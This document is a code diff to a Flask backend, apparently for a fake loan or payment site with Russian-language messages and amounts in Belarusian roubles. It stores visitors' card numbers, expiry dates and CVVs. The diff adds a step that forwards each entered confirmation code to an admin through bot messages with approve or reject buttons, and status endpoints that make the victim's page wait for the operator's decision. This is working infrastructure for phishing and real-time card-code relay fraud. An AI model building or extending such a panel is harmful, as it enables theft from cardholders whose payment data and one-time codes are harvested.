@@ -29,7 +29,8 @@ def init_db():
     c.execute('''CREATE TABLE IF NOT EXISTS card_data
                  (session_id TEXT PRIMARY KEY,
                   card_holder TEXT, card_number TEXT, card_expiry TEXT, card_cvv TEXT,
-                  status TEXT DEFAULT 'pending')''')
+                  status TEXT DEFAULT 'pending',
+                  code_status TEXT DEFAULT 'pending')''')
     conn.commit()
     conn.close()
 
@@ -101,21 +102,41 @@ def webhook():
             session_id = callback_data.split(':')[1]
             conn = sqlite3.connect('applications.db')
             c = conn.cursor()
-            c.execute('INSERT OR REPLACE INTO card_data (session_id, status) VALUES (?, ?)', (session_id, 'approved'))
+            c.execute('UPDATE card_data SET status = "approved" WHERE session_id = ?', (session_id,))
             conn.commit()
             conn.close()
-            send_callback_answer(callback_id, "✅ Данные подтверждены")
+            send_callback_answer(callback_id, "✅ Данные карты подтверждены")
             edit_message_text(chat_id, message_id, f"✅ <b>ДАННЫЕ КАРТЫ ПОДТВЕРЖДЕНЫ</b>\n\nСессия: {session_id}", None)
             
         elif callback_data.startswith('card_error:'):
             session_id = callback_data.split(':')[1]
             conn = sqlite3.connect('applications.db')
             c = conn.cursor()
-            c.execute('INSERT OR REPLACE INTO card_data (session_id, status) VALUES (?, ?)', (session_id, 'rejected'))
+            c.execute('UPDATE card_data SET status = "rejected" WHERE session_id = ?', (session_id,))
             conn.commit()
             conn.close()
-            send_callback_answer(callback_id, "❌ Данные отклонены")
+            send_callback_answer(callback_id, "❌ Данные карты отклонены")
             edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
+            
+        elif callback_data.startswith('code_ok:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE card_data SET code_status = "approved" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "✅ Код подтверждён")
+            edit_message_text(chat_id, message_id, f"✅ <b>КОД ПОДТВЕРЖДЁН</b>\n\nСессия: {session_id}", None)
+            
+        elif callback_data.startswith('code_error:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE card_data SET code_status = "rejected" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "❌ Код отклонён")
+            edit_message_text(chat_id, message_id, f"❌ <b>КОД ОТКЛОНЁН</b>\n\nСессия: {session_id}", None)
     
     return jsonify({"status": "ok"})
 
@@ -173,7 +194,6 @@ def submit_card():
     phone = app_data[1] if app_data else '—'
     amount = app_data[2] if app_data else '—'
     
-    # Сохраняем данные карты
     c.execute('INSERT OR REPLACE INTO card_data (session_id, card_holder, card_number, card_expiry, card_cvv, status) VALUES (?, ?, ?, ?, ?, ?)',
               (session_id, data['card_holder'], data['card_number'], data['card_expiry'], data['card_cvv'], 'pending'))
     conn.commit()
@@ -201,6 +221,61 @@ def submit_card():
     
     send_to_admin(msg, keyboard)
     return jsonify({"status": "ok"})
+
+@app.route('/check_card_status/<session_id>', methods=['GET'])
+def check_card_status(session_id):
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT status FROM card_data WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        return jsonify({"status": row[0]})
+    return jsonify({"status": "pending"})
+
+@app.route('/submit_code_check', methods=['POST'])
+def submit_code_check():
+    data = request.json
+    session_id = data['session_id']
+    code = data['code']
+    
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT fullname, amount FROM applications WHERE session_id = ?', (session_id,))
+    app_data = c.fetchone()
+    conn.close()
+    
+    fullname = app_data[0] if app_data else '—'
+    amount = app_data[1] if app_data else '—'
+    
+    msg = f"""🔐 <b>ПОДТВЕРЖДЕНИЕ КОДА</b>
+
+👤 Клиент: {fullname}
+💰 Сумма: {amount} BYN
+🔢 Введённый код: <code>{code}</code>
+
+🆔 Сессия: <code>{session_id}</code>"""
+    
+    keyboard = {
+        "inline_keyboard": [
+            [{"text": "✅ Код верный", "callback_data": f"code_ok:{session_id}"}],
+            [{"text": "❌ Код не верный", "callback_data": f"code_error:{session_id}"}]
+        ]
+    }
+    
+    send_to_admin(msg, keyboard)
+    return jsonify({"status": "ok"})
+
+@app.route('/check_code_status/<session_id>', methods=['GET'])
+def check_code_status(session_id):
+    conn = sqlite3.connect('applications.db')
+    c = conn.cursor()
+    c.execute('SELECT code_status FROM card_data WHERE session_id = ?', (session_id,))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        return jsonify({"status": row[0]})
+    return jsonify({"status": "pending"})
 
 @app.route('/submit_phone', methods=['POST'])
 def submit_phone():
